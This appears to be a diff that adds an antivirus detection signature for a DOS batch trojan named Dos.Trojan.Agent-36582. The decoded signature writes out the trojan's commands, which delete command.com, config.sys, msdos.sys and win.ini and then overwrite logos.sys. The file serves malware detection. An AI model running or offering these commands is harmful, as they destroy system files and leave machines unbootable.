@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36582
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls cd\ del command.com del config.sys del msdos.sys cd windows del win.ini cd\ cd windows del logos.sys copy c:\batch vm 0.1\sistema\logos.sys c:\windows\logos.sys exit 
